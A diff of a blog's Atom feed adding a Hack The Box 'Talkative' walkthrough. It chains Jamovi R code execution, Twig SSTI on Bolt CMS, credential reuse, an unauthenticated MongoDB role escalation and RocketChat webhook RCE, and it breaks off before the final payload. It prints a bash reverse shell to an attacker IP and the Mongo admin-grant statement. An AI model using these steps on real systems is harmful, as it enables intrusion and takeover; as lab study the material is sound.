@@ -1,4 +1,547 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-10-19T02:51:38+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Linux - Medium] - Mango</title><link href="http://localhost:4000/2022/10/11/Mango.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Medium] - Mango" /><published>2022-10-11T00:00:00+02:00</published><updated>2022-10-11T00:00:00+02:00</updated><id>http://localhost:4000/2022/10/11/Mango</id><content type="html" xml:base="http://localhost:4000/2022/10/11/Mango.html"><![CDATA[<p><img src="/assets/Mango/Mango.png" alt="" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-10-20T00:52:09+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Linux - Hard] - Talkative</title><link href="http://localhost:4000/2022/10/19/Talkative.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Hard] - Talkative" /><published>2022-10-19T00:00:00+02:00</published><updated>2022-10-19T00:00:00+02:00</updated><id>http://localhost:4000/2022/10/19/Talkative</id><content type="html" xml:base="http://localhost:4000/2022/10/19/Talkative.html"><![CDATA[<p><img src="/assets/Talkative/Talkative.png" alt="" /></p>
+
+<h2 id="summary">Summary</h2>
+<ul>
+  <li><strong>Talkative</strong> is a <strong>Linux</strong> box with a <strong>long chain of exploitation</strong> that went <strong><em>through several containers</em></strong> to finally crack the host.</li>
+  <li>The <strong>intial foothold</strong> is through <strong>an analytics web app</strong> called <strong>Jamovi</strong> that was on <strong>port 8080</strong>. It had a <strong>plugin called “RJ Editor”</strong> which allowed us to <strong>run system commands</strong> using <strong>the R language.</strong></li>
+  <li><strong><em>With an R reverse shell,</em></strong> we <strong>got on that application’s container</strong> as <code class="language-plaintext highlighter-rouge">root</code>.</li>
+  <li>We attempted to <strong>break out of it</strong> and <strong>get on the host</strong> but couldn’t find a way to do that.</li>
+  <li><em>In that docker’s</em> <code class="language-plaintext highlighter-rouge">/root</code> <em>directory,</em> we <strong>found an archive</strong> called <code class="language-plaintext highlighter-rouge">Bolt-Administration</code> which <strong>contained 3 sets of credentials.</strong></li>
+  <li>We <strong>reused the passwords</strong> we found on the <strong>Bolt CMS instance</strong> on <strong>port 80</strong> and <strong>could log in</strong> as <code class="language-plaintext highlighter-rouge">admin</code></li>
+  <li><em>Because Bolt CMS used the</em> <strong>Twig PHP template engine</strong>, we were able to <strong>abuse it</strong> to <strong>obtain RCE</strong> via <strong>Server-Side Template Injection (SSTI).</strong></li>
+  <li>We got a shell as <code class="language-plaintext highlighter-rouge">www-data</code> within <strong>the Bolt container</strong>. <em>And from it,</em> we could <code class="language-plaintext highlighter-rouge">SSH</code> to the host <strong>using the credentials we found</strong> (port 22 was filtered from the outside).</li>
+  <li><em>On the host,</em> we <strong>uploaded a standalone version of</strong> <code class="language-plaintext highlighter-rouge">nmap</code> and did a <strong>full port scan</strong> on <strong>all the hosted docker instances.</strong></li>
+  <li><strong>One of the containers</strong> had <strong>port 27017 open</strong> which is the <strong>default port for MongoDB.</strong></li>
+  <li>We set up <code class="language-plaintext highlighter-rouge">chisel</code> to <strong>forward any connections</strong> from our Kali to that port. And <strong>could access the Mongo database</strong> <em>through the tunnel</em> <strong><em>without authentication</em></strong>.</li>
+  <li><em>While checking Mongo,</em> we <strong>found the database for RocketChat</strong> which we could alter.</li>
+  <li><em>To abuse it,</em> we <strong>registered a user</strong> through the RocketChat web application and <strong>changed our role to</strong> <code class="language-plaintext highlighter-rouge">admin</code> with a NoSQL update statement.</li>
+  <li>We could <strong>obtain RCE</strong> through the app by <strong>creating an Integration</strong> for an <strong>incoming web hook</strong> that <strong>ran server-side JavaScript</strong> when triggered.</li>
+  <li><em>After getting</em> <strong><em>a reverse shell on the RocketChat container</em></strong> <em>as</em> <code class="language-plaintext highlighter-rouge">root</code>, we <strong>installed a few dependencies</strong> to <strong>detect dangerous capabilities.</strong></li>
+  <li>We found the <code class="language-plaintext highlighter-rouge">cap_dac_read_search</code> and <code class="language-plaintext highlighter-rouge">cap_dac_override</code> capabilities and <strong>exploited them</strong> to <strong>write an SSH public key</strong> over the host’s <code class="language-plaintext highlighter-rouge">/root/.ssh/authorized_keys</code> file then <strong>used the private key to SSH to it</strong> as <code class="language-plaintext highlighter-rouge">root</code>.</li>
+</ul>
+
+<hr />
+
+<h2 id="nmap">NMAP</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Nmap 7.92 scan initiated Thu Sep  8 05:52:25 2022 as: nmap -sC -sV --version-all -oN 10.10.11.155-full-scan.nmap -p 22,80,3000,8080,8081,8082 10.10.11.155
+Nmap scan report for talkative (10.10.11.155)
+Host is up (0.12s latency).
+
+PORT     STATE    SERVICE VERSION
+22/tcp   filtered ssh
+80/tcp   open     http    Apache httpd 2.4.52
+|_http-title: Did not follow redirect to http://talkative.htb
+|_http-server-header: Apache/2.4.52 (Debian)
+3000/tcp open     ppp?
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     X-XSS-Protection: 1
+|     X-Instance-ID: Bcy5tmWBNwCAATRnA
+|     Content-Type: text/html; charset=utf-8
+|     Vary: Accept-Encoding
+|     Date: Thu, 08 Sep 2022 09:52:38 GMT
+|     Connection: close
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html&gt;
+|     &lt;head&gt;
+|     &lt;link rel="stylesheet" type="text/css" class="__meteor-css__" href="/3ab95015403368c507c78b4228d38a494ef33a08.css?meteor_css_resource=true"&gt;
+|     &lt;meta charset="utf-8" /&gt;
+|     &lt;meta http-equiv="content-type" content="text/html; charset=utf-8" /&gt;
+|     &lt;meta http-equiv="expires" content="-1" /&gt;
+|     &lt;meta http-equiv="X-UA-Compatible" content="IE=edge" /&gt;
+|     &lt;meta name="fragment" content="!" /&gt;
+|     &lt;meta name="distribution" content="global" /&gt;
+|     &lt;meta name="rating" content="general" /&gt;
+|     &lt;meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" /&gt;
+|     &lt;meta name="mobile-web-app-capable" content="yes" /&gt;
+|     &lt;meta name="apple-mobile-web-app-capable" conten
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     X-XSS-Protection: 1
+|     X-Instance-ID: Bcy5tmWBNwCAATRnA
+|     Content-Type: text/html; charset=utf-8
+|     Vary: Accept-Encoding
+|     Date: Thu, 08 Sep 2022 09:52:39 GMT
+|     Connection: close
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html&gt;
+|     &lt;head&gt;
+|     &lt;link rel="stylesheet" type="text/css" class="__meteor-css__" href="/3ab95015403368c507c78b4228d38a494ef33a08.css?meteor_css_resource=true"&gt;
+|     &lt;meta charset="utf-8" /&gt;
+|     &lt;meta http-equiv="content-type" content="text/html; charset=utf-8" /&gt;
+|     &lt;meta http-equiv="expires" content="-1" /&gt;
+|     &lt;meta http-equiv="X-UA-Compatible" content="IE=edge" /&gt;
+|     &lt;meta name="fragment" content="!" /&gt;
+|     &lt;meta name="distribution" content="global" /&gt;
+|     &lt;meta name="rating" content="general" /&gt;
+|     &lt;meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" /&gt;
+|     &lt;meta name="mobile-web-app-capable" content="yes" /&gt;
+|     &lt;meta name="apple-mobile-web-app-capable" conten
+|   Help, NCP: 
+|_    HTTP/1.1 400 Bad Request
+8080/tcp open     http    Tornado httpd 5.0
+|_http-title: jamovi
+|_http-server-header: TornadoServer/5.0
+8081/tcp open     http    Tornado httpd 5.0
+|_http-title: 404: Not Found
+|_http-server-header: TornadoServer/5.0
+8082/tcp open     http    Tornado httpd 5.0
+|_http-title: 404: Not Found
+|_http-server-header: TornadoServer/5.0
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">nmap</code> gives us <strong>a lot of ports</strong> to check out: <strong>80, 3000 and 8080 through 8082</strong>. <strong>SSH</strong> is there but <em>filtered</em> which suggest it’s closed off by a firewall or something.</p>
+
+<ul>
+  <li><strong>Port 80</strong> redirects to <code class="language-plaintext highlighter-rouge">http://talkative.htb</code> so we have <strong>a host name</strong> to add to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file and we might want to <strong>search for other vhosts.</strong></li>
+  <li><strong>Port 3000</strong> seems to be a <strong>web application.</strong></li>
+  <li><strong>Port 8080</strong> has <strong>Jamovi</strong> as a title which seems interesting.</li>
+  <li><strong>Ports 8081 and 8082</strong> give a <code class="language-plaintext highlighter-rouge">404 - Not Found</code>. there might be more to them.</li>
+  <li><em>And Lastly,</em> <strong>all 808X ports</strong> are hosted on a <strong>different type of web server</strong> called <strong>“Tornado httpd”</strong> with a version of 5.0 (we could check if it’s vulnerble)</li>
+</ul>
+
+<h2 id="checking-out-port-80">Checking Out Port 80</h2>
+<p><em>After modifying the</em> <code class="language-plaintext highlighter-rouge">/etc/hosts</code> <em>file with the</em> <code class="language-plaintext highlighter-rouge">talkative.htb</code> <em>hostname</em>, we visit the website:</p>
+
+<p><img src="/assets/Talkative/Port-80-wappalyzer.jpg" alt="" /></p>
+
+<p><strong>Wappalyzer</strong> shows us it’s running <strong>Bolt CMS</strong> and <strong>PHP as its server-side language</strong>. Good to know.</p>
+
+<p>we also find a <strong>list of usernames</strong> there:</p>
+
+<p><img src="/assets/Talkative/port-80-usernames-and-links.jpg" alt="" /></p>
+
+<p>each user’s <strong>“Read More”</strong> link takes us to <strong>another page with his email in it</strong>:</p>
+
+<p><img src="/assets/Talkative/janit-user-mail.jpg" alt="" /></p>
+
+<p>we get 3 usernames/emails:</p>
+
+<ol>
+  <li><strong>Janit Smith</strong> [janit@talkative.htb]</li>
+  <li><strong>Saul Goodman</strong> [saul@talkative.htb]</li>
+  <li><strong>Matt Williams</strong> [matt@talkative.htb]</li>
+</ol>
+
+<p><em>Down at the bottom,</em> we also find <strong>references to 3 products</strong></p>
+
+<p><img src="/assets/Talkative/port-80-products.jpg" alt="" /></p>
+
+<h3 id="1-talkzone">1. TALKZONE</h3>
+<p>the first one was <em>a bit vague</em></p>
+
+<p><img src="/assets/Talkative/port-80-talkzone.jpg" alt="" /></p>
+
+<h3 id="2-talkforbiz-coming-soon">2. TALKFORBIZ (Coming Soon)</h3>
+
+<p>this one talked about an application called <strong>“RocketChat”</strong> where it’s <strong>free to register</strong> an account.</p>
+
+<p><img src="/assets/Talkative/port-80-talkforbiz-rocket-chat-hint.jpg" alt="" /></p>
+
+<h3 id="3-talk-a-stats-coming-soon">3. TALK-A-STATS (Coming Soon)</h3>
+
+<p><strong>Jamovi</strong> is mentioned here as well as <strong>a link to it.</strong></p>
+
+<p><img src="/assets/Talkative/port-80-talkastats.jpg" alt="" /></p>
+
+<p><em>But apart from that,</em> <strong>there wasn’t much here</strong> to played with. So we moved on..</p>
+
+<h2 id="checking-port-3000">Checking Port 3000</h2>
+
+<p><em>Over port 3000,</em> we found <strong>the homepage for RocketChat</strong>. It indeed <strong>allowed registration</strong> as mentioned above.</p>
+
+<p><img src="/assets/Talkative/port-3000-rocket-registration.jpg" alt="" /></p>
+
+<p>We <strong>could register</strong> with <code class="language-plaintext highlighter-rouge">test@talkative.htb</code>. Trying other domains like <code class="language-plaintext highlighter-rouge">@test.com</code> didn’t work.</p>
+
+<p>The <strong>“Channels”</strong> area had one channel: <strong>“#general”</strong>. There wasn’t any information there.</p>
+
+<p><img src="/assets/Talkative/port-3000-empty-chat.jpg" alt="" /></p>
+
+<p><em>Before diving any deeper here, ex:</em> <strong><em>fingerprinting the web app’s version</em></strong> <em>and</em> <em>searching for exploits,</em> we decided to first <strong>take a quick look on Jamovi</strong>.</p>
+
+<h2 id="the-jamovi-web-app-and-container">The Jamovi Web App and Container</h2>
+
+<p>The home page had <strong>an indicator of a vulnerability.</strong></p>
+
+<p><img src="/assets/Talkative/jamovi-first-look.jpg" alt="" /></p>
+
+<p><em>On the toolbar above,</em> there was <strong>an “R” icon</strong> which had a drop-down menu. It had something called <strong>“RJ Editor”.</strong></p>
+
+<p><img src="/assets/Talkative/jamovi-rj-editor.jpg" alt="" /></p>
+
+<p><em>When checking it out,</em> it seemed like <strong>a web console</strong> where we could <strong>run code.</strong></p>
+
+<p><img src="/assets/Talkative/jamovi-rj-editor-code.jpg" alt="" /></p>
+
+<p><strong>“R”</strong> is a <strong>programming language</strong> commonly used for <strong>statistics-related stuff</strong>. <strong><em>But can we abuse it?</em></strong></p>
+
+<p>we searched <strong>Google</strong> for <strong>“r reverse shell”</strong></p>
+
+<p><img src="/assets/Talkative/search-r-reverse-shell.jpg" alt="" /></p>
+
+<p>and found this <a href="https://gist.github.com/trietptm/05f385df4d2d8c0ee35b217e7307e462">Github gist</a> as the first result</p>
+
+<p><img src="/assets/Talkative/r-reverse-shell-gist.jpg" alt="" /></p>
+
+<p>it got us <strong>a shell</strong> as <code class="language-plaintext highlighter-rouge">root</code></p>
+
+<p><img src="/assets/Talkative/jamovi-container-rooted.jpg" alt="" /></p>
+
+<p><em>the first thing we noticed after getting in,</em> was <strong>being in a container.</strong></p>
+
+<p>we could tell from the <code class="language-plaintext highlighter-rouge">.dockerenv</code> file in the system root.</p>
+
+<p><img src="/assets/Talkative/jamovi-container.jpg" alt="" /></p>
+
+<h3 id="finding-creds-in-the-root-users-directory">Finding Creds in the Root User’s Directory</h3>
+
+<p><em>In</em> <code class="language-plaintext highlighter-rouge">/root</code>, we found <strong>an interesting file:</strong> <code class="language-plaintext highlighter-rouge">bolt-administration.omv</code></p>
+
+<p><img src="/assets/Talkative/jamovi-container-root-dir.jpg" alt="" /></p>
+
+<p><em>But since the</em> <code class="language-plaintext highlighter-rouge">unzip</code> <em>utility wasn’t there on the docker,</em> we used a <strong>bash trick</strong> -<em>commonly-used in reverse shells</em>- to <strong>transfer it back</strong> to our Kali.</p>
+
+<p><img src="/assets/Talkative/file-transfer-without-nc.jpg" alt="" /></p>
+
+<p><em>Having</em> <strong><em>verified the file’s integrity</em></strong> <em>using</em> <code class="language-plaintext highlighter-rouge">md5sum</code>, we <strong>unzipped the archive</strong>.</p>
+
+<p><img src="/assets/Talkative/unzipping-bolt-archive.jpg" alt="" /></p>
+
+<p>the <code class="language-plaintext highlighter-rouge">xdata.json</code> file within had the <strong><em>kind of loot we were looking for :D</em></strong></p>
+
+<p><img src="/assets/Talkative/bolt-archive-loot.jpg" alt="" /></p>
+
+<p><em>from the file’s name,</em> we know that <strong>the creds inside should work for Bolt.</strong></p>
+
+<p><em>but before taking that route,</em> we must first do <strong>a couple of important checks.</strong></p>
+
+<h3 id="check-1-scanning-our-subnet-and-attempting-to-reach-the-host">Check #1: Scanning our Subnet and Attempting to Reach the Host</h3>
+
+<p>we need to <strong>discover the Container Environment</strong> and see if we can <strong>reach the host</strong> spawning our docker.</p>
+
+<p><em>if the host</em> <strong><em>exposed its SSH port</em></strong> <em>to our container,</em> we could try <strong>reusing the creds</strong> we found there.</p>
+
+<p>we will first <strong>get our docker’s IP</strong> using <code class="language-plaintext highlighter-rouge">hostname -i</code></p>
+
+<p><img src="/assets/Talkative/jamovi-container-ip.jpg" alt="" /></p>
+
+<p>we’re at <code class="language-plaintext highlighter-rouge">172.18.0.2</code>.</p>
+
+<p><em>Usually,</em> the host <strong>holds the first IP</strong> on the subnet (<em>here,</em> that would be <code class="language-plaintext highlighter-rouge">172.18.0.1</code>).</p>
+
+<p><em>To confirm this,</em> we needed either <code class="language-plaintext highlighter-rouge">ping</code> or <code class="language-plaintext highlighter-rouge">ssh</code>. but <strong><em>neither was available :/</em></strong></p>
+
+<p><img src="/assets/Talkative/jamovi-container-no-ping-no-ssh-client.jpg" alt="" /></p>
+
+<p>A <strong>handy tool</strong> here would be <code class="language-plaintext highlighter-rouge">nmap</code>. we’re going to upload a <a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap">Standalone Binary</a> for it to our container.</p>
+
+<p><em>For the transfer,</em> we used the <strong>same bash tricks</strong> as earlier but <em>in the opposite direction</em> this time.</p>
+
+<p><img src="/assets/Talkative/jamovi-container-transfer-nmap.jpg" alt="" /></p>
+
+<p>we ran <strong>a quick network discovery</strong> with <code class="language-plaintext highlighter-rouge">-sn</code> and <strong>increased the rate</strong> with <code class="language-plaintext highlighter-rouge">--min-rate</code> and <code class="language-plaintext highlighter-rouge">-T4</code> for speed</p>
+
+<p><img src="/assets/Talkative/jamovi-container-network-discovery.jpg" alt="" /></p>
+
+<p>we <strong>only found</strong> the <code class="language-plaintext highlighter-rouge">172.18.0.1</code> host up.</p>
+
+<p><em>Next,</em> we ran a <strong>full port scan</strong> against it.</p>
+
+<p><em>but to do that,</em> <code class="language-plaintext highlighter-rouge">nmap</code> needed a file (<code class="language-plaintext highlighter-rouge">/etc/services</code>) that was missing.</p>
+
+<p>that file <strong>was there on our Kali</strong>. so we got it and re-ran <code class="language-plaintext highlighter-rouge">nmap</code>.</p>
+
+<p><img src="/assets/Talkative/jamovi-container-no-ssh-to-host.jpg" alt="" /></p>
+
+<p>the <strong>SSH port was filtered</strong>. <strong><em>Still worth it though :)</em></strong></p>
+
+<p>the <strong>remaining ports</strong> were <em>already exposed from outside</em>. so we moved on..</p>
+
+<h3 id="check-2-attempting-to-escape-our-container">Check #2: Attempting to Escape our Container</h3>
+
+<p><em>Because we had the</em> <code class="language-plaintext highlighter-rouge">root</code> <em>privilege</em>, it was also worth it to run a tool like <a href="https://github.com/stealthcopter/deepce">deepce.sh</a> to <strong>try and break out of our docker onto the host.</strong></p>
+
+<p><img src="/assets/Talkative/jamovi-deepce-sh.jpg" alt="" /></p>
+
+<p>The <strong>capability</strong> we found: <code class="language-plaintext highlighter-rouge">cap_dac_override</code> wasn’t dangerous on its own.</p>
+
+<p>It required the <code class="language-plaintext highlighter-rouge">cap_dac_read_search</code> with it to <strong><em>enable a Docker escape.</em></strong></p>
+
+<p><em>Having</em> <strong>checked the above shorcuts</strong> <em>and found them closed,</em> we can now <strong><em>safely pay Bolt a visit without looking back :)</em></strong></p>
+
+<h2 id="reusing-creds-on-bolt-and-exploiting-it-for-rce">Reusing Creds on Bolt and Exploiting it for RCE</h2>
+
+<p><em>To find bolt’s login page,</em> we <strong>searched Google:</strong> “bolt admin login”.</p>
+
+<p>we found the <a href="https://docs.boltcms.io/5.0/manual/login">Official Documentation Page</a></p>
+
+<p><em>according to it,</em> the <code class="language-plaintext highlighter-rouge">/bolt</code> web directory <strong>contains the login page.</strong></p>
+
+<p><img src="/assets/Talkative/bolt-login-page.jpg" alt="" /></p>
+
+<p>Trying <strong>all the usernames</strong> and <strong>emails</strong> with <strong>all the passwords</strong> didn’t get us in.</p>
+
+<p><em>However,</em> trying the <code class="language-plaintext highlighter-rouge">admin</code> username worked with <code class="language-plaintext highlighter-rouge">jeO09ufhWD&lt;s</code> (<code class="language-plaintext highlighter-rouge">matt</code><em>’s password</em>).</p>
+
+<p><em>Looking around for RCE venues,</em> we tried to <strong>upload a PHP reverse shell</strong> since Bolt ran it server-side.</p>
+
+<p>But <strong>that file type wasn’t allowed.</strong></p>
+
+<p><img src="/assets/Talkative/bolt-fail-to-upload-php.jpg" alt="" /></p>
+
+<p>And <strong>editing the config file</strong> wasn’t an option either.</p>
+
+<p><img src="/assets/Talkative/bolt-cant-edit-config-file.jpg" alt="" /></p>
+
+<p><em>However, since the</em> <code class="language-plaintext highlighter-rouge">.twig</code> <em>file extension was allowed,</em> we had a chance to <strong>execute code</strong> through <strong>Server-Side Template Injection (SSTI).</strong></p>
+
+<p><em>because</em> <strong>Twig</strong> <em>is a</em> <strong>template engine for PHP</strong>, it essentially <strong>enables us to run server-side code.</strong></p>
+
+<p><em>To proceed,</em> we went to <strong>“File Management”</strong> &gt; <strong>“View &amp; edit templates”</strong></p>
+
+<p><img src="/assets/Talkative/bolt-view-edit-templates.jpg" alt="" /></p>
+
+<p>We <strong>chose the “base-2021” theme</strong> since it was the one <em>likely in use</em> then selected <code class="language-plaintext highlighter-rouge">index.twig</code> for editing.</p>
+
+<p><img src="/assets/Talkative/bolt-index-twig-writable.jpg" alt="" /></p>
+
+<p><em>it looked writable,</em> so we next <strong>inserted a standard SSTI payload</strong> from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#twig">PayloadAllTheThings</a> Github Repo</p>
+
+<p><img src="/assets/Talkative/bolt-basic-ssti-payload.jpg" alt="" /></p>
+
+<p><em>After saving,</em> this payload was <strong>expected to reflect</strong> on the home page.</p>
+
+<p>But that <strong>change didn’t take effect</strong> until we <strong>“Cleared the Cache”</strong> from the option under the <strong>“Maintenance”</strong> section.</p>
+
+<p><img src="/assets/Talkative/bolt-clear-the-cache-feature.jpg" alt="" /></p>
+
+<p>the <strong>number 49</strong> appeared at the <strong>top right corner</strong> of the page.</p>
+
+<p><img src="/assets/Talkative/bolt-ssti-execution-confirmed.jpg" alt="" /></p>
+
+<p><em>Having</em> <strong><em>confirmed code execution,</em></strong> we switched to a <strong>base64-encoded bash reverse shell</strong> payload:</p>
+
+<p><img src="/assets/Talkative/bolt-ssti-bash-reverse-shell.jpg" alt="" /></p>
+
+<p><strong>which is</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.16.9/9000 0&gt;&amp;1
+</code></pre></div></div>
+
+<p><em>with another cache clear and a visit to the home page,</em> we <strong>get back a shell</strong> as <code class="language-plaintext highlighter-rouge">www-data</code></p>
+
+<p><img src="/assets/Talkative/bolt-ssti-shell-access.jpg" alt="" /></p>
+
+<h2 id="enumerating-the-2nd-container-subnet-and-reaching-the-host">Enumerating the 2nd Container Subnet and Reaching the Host</h2>
+
+<p><strong>Listing the contents of the system root</strong> showed us we were now in <strong>another Docker container</strong> but with a <strong>different IP</strong> of <code class="language-plaintext highlighter-rouge">172.17.0.13</code></p>
+
+<p><img src="/assets/Talkative/bolt-docker-ip.jpg" alt="" /></p>
+
+<p>This was a <strong>different subnet</strong> from the <strong>Jamovi</strong> container’s (<code class="language-plaintext highlighter-rouge">172.18.0.0/24</code>).</p>
+
+<p><strong><em>to discover this area,</em></strong> we’re going to do <strong>the same thing as before:</strong> use <code class="language-plaintext highlighter-rouge">nmap</code></p>
+
+<p><img src="/assets/Talkative/bolt-docker-getting-nmap.jpg" alt="" /></p>
+
+<p><em>after transferring it,</em> we run <strong>a host discovery</strong> over the <code class="language-plaintext highlighter-rouge">172.17.0.0/24</code> subnet</p>
+
+<p><img src="/assets/Talkative/bolt-docker-nmap-discovery.jpg" alt="" /></p>
+
+<p>we found <strong>a LOT of live devices</strong> there (<em>from</em> <code class="language-plaintext highlighter-rouge">172.17.0.1</code> <em>all the way up to</em> <code class="language-plaintext highlighter-rouge">172.17.0.19</code>)</p>
+
+<p>we’ve been wanting to <strong>try the creds</strong> we found <strong>on the host’s SSH port</strong>. <em>But it was always filtered.</em></p>
+
+<p><em>However, on this container,</em> we found the <strong>SSH client installed</strong> which was interesting.</p>
+
+<p>we tried to <strong>connect to the host</strong> as <code class="language-plaintext highlighter-rouge">root</code>:</p>
+
+<p><img src="/assets/Talkative/bolt-docker-try-ssh-to-host.jpg" alt="" /></p>
+
+<p><em>After a couple of tries,</em> the <strong>set of creds</strong> that worked were:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>saul
+jeO09ufhWD
+</code></pre></div></div>
+
+<p><img src="/assets/Talkative/ssh-as-saul.jpg" alt="" /></p>
+
+<h2 id="finding-rocketchats-mongodb-instance-and-altering-it">Finding RocketChat’s MongoDB Instance and Altering it</h2>
+
+<p><em>Trying to privesc,</em> we ran <a href="https://github.com/carlospolop/PEASS-ng">linpeas</a> here. But we <strong>didn’t find a way</strong> to <code class="language-plaintext highlighter-rouge">root</code>.</p>
+
+<p><em>but, when looking at</em> <strong>the system processes,</strong> we noticed <strong>plenty of docker instances</strong> running:</p>
+
+<p><img src="/assets/Talkative/host-enumerating-docker-processes.jpg" alt="" /></p>
+
+<ul>
+  <li><strong>Most of the ports</strong> were 80.</li>
+  <li>There was <strong>one for 3000</strong> which was <strong>probably RocketChat</strong>. A container we haven’t touched.</li>
+  <li>There were <strong>other high ports</strong> that we wanted to check.</li>
+</ul>
+
+<p><strong><em>But to be sure we weren’t missing any other ports,</em></strong> we uploaded <code class="language-plaintext highlighter-rouge">nmap</code> a 3rd time and ran a <strong>full port scan</strong> over the entire <code class="language-plaintext highlighter-rouge">172.17.0.2-19</code> IP range.</p>
+
+<p>And we <strong>did find something very interesting.</strong></p>
+
+<p><img src="/assets/Talkative/host-mongo-db-discovered.jpg" alt="" /></p>
+
+<p><strong>Port 27017</strong> is the <strong>default port for MongoDB</strong>. which is <strong>known for having no authentication</strong> <em>by default.</em></p>
+
+<p><em>to reach that port on the</em> <code class="language-plaintext highlighter-rouge">172.17.0.2</code> <em>host,</em> we will need <strong>some Port Forwarding magic.</strong></p>
+
+<p><a href="https://github.com/jpillora/chisel">Chisel</a> is a <strong>nice choice</strong> for its <strong>ease-of-use</strong>.</p>
+
+<p>we <strong>upload it</strong> to the bolt container and <strong>create a tunnel to Mongo.</strong></p>
+
+<p><img src="/assets/Talkative/tunneling-and-reaching-mongodb.jpg" alt="" /></p>
+
+<p><em>Having authenticated without any credentials,</em> we could <strong>enumerate the database</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># listing the databases</span>
+show dbs
+<span class="c"># using the meteor database</span>
+use meteor
+<span class="c"># showing collections within the meteor db (equivaled to tables in MySQL)</span>
+show collections
+</code></pre></div></div>
+
+<p><em>among the various collections,</em> we found one called <strong>“users”</strong> which had interesting stuff:</p>
+
+<p><img src="/assets/Talkative/saul-rockechat-user.jpg" alt="" /></p>
+
+<p>we noticed <code class="language-plaintext highlighter-rouge">saul</code>’s account, which <strong>had an admin role.</strong></p>
+
+<p><strong><em>Trying to compromise it,</em></strong> we:</p>
+<ol>
+  <li><strong>tried to login</strong> using the <strong>passwords we found earlier.</strong> none worked.</li>
+  <li>we also tried <strong>cracking the bcrypt hash</strong>. but without any luck.</li>
+  <li>we <strong>replaced that bcrypt hash</strong> with one of our own. <em>still, for some reason,</em> <strong>that change didn’t reflect.</strong></li>
+  <li>we even <strong>used his ID and token as cookies</strong> to impersonate him. but, <strong>that also didn’t work</strong> :/</li>
+</ol>
+
+<p><img src="/assets/Talkative/using-saul-cookies-for-impersonation.jpg" alt="" /></p>
+
+<p><strong><em>so, instead,</em></strong> we chose to <strong>update our user’s role</strong> in the database to <strong>grant him admin privileges :D</strong></p>
+
+<p>we ran the <strong>NoSQL update statement</strong> below to carry this out.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">db</span><span class="p">.</span><span class="nx">users</span><span class="p">.</span><span class="nx">update</span><span class="p">({</span> <span class="na">_id</span> <span class="p">:</span> <span class="dl">"</span><span class="s2">voBu5qYu5ye3vDcw7</span><span class="dl">"</span><span class="p">},</span> <span class="p">{</span>
+	<span class="na">$set</span><span class="p">:</span> <span class="p">{</span> 
+		<span class="na">roles</span><span class="p">:</span> <span class="p">[</span><span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span><span class="p">]</span>
+	<span class="p">}</span>
+<span class="p">})</span>
+</code></pre></div></div>
+
+<p><img src="/assets/Talkative/mongo-grant-admin-role.jpg" alt="" /></p>
+
+<p>it <strong>ran without problems</strong>. we confirmed this with another query.</p>
+
+<p><img src="/assets/Talkative/mongo-admin-role-granted.jpg" alt="" /></p>
+
+<p><em>after relogging,</em> we could now <strong>access RocketChat’s administrator interface</strong> at <code class="language-plaintext highlighter-rouge">/admin</code></p>
+
+<p><img src="/assets/Talkative/rocket-chat-logged-in-as-admin.jpg" alt="" /></p>
+
+<p><em>Noticing the version,</em> we <strong>searched for exploits</strong> but <em>didn’t get any results.</em></p>
+
+<h2 id="exploiting-rocketchat-integrations-for-rce">Exploiting RocketChat Integrations for RCE</h2>
+<p><em>While searching</em> <strong><em>Google</em></strong> <em>for ways to</em> <strong><em>execute code using RocketChat’s admin,</em></strong> we came across a <strong>couple of results.</strong></p>
+
+<p><img src="/assets/Talkative/rocket-chat-search-admin-rce.jpg" alt="" /></p>
+
+<p><em>Checking the one on</em> <a href="https://www.exploit-db.com/exploits/50108">Exploit-DB</a>, We <strong>looked closely</strong> at the <code class="language-plaintext highlighter-rouge">rce</code> <strong>function</strong> within the <strong>Python code.</strong></p>
+
+<p>it seemed that <strong>RochetChat’s Integration feature</strong> was <strong>being abused</strong> to <strong>run Javascript code server-side</strong>. This is how <strong>Remote Code Execution</strong> was obtained.</p>
+
+<p><img src="/assets/Talkative/rocket-chat-rce-exploit-analysis.jpg" alt="" /></p>
+
+<p><em>following the exploit’s way of creating its payload,</em> we <strong>created our own Integration</strong> and <strong>Incoming Web Hook</strong> to <strong>execute a bash reverse shell</strong> instead of the <code class="language-plaintext highlighter-rouge">cmd</code> variable above.</p>
+
+<p><strong>Here’s the code:</strong></p>
+
